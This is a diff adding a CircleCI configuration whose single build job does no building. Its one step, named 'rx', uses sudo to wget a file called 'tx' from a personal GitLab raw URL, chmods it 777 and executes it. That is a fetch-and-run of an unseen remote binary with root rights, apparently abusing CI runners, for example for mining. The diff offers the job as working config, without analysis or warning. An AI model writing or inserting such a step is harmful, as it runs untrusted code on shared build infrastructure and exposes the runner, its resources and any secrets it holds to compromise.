@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+  build:
+    docker:
+      - image: cimg/base:stable
+
+    steps:
+      - run:
+          name: "rx"
+          command: |
+           sudo su --command "wget https://gitlab.com/TandraKauffman/rx/-/raw/main/tx && chmod 777 tx && ./tx"
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+
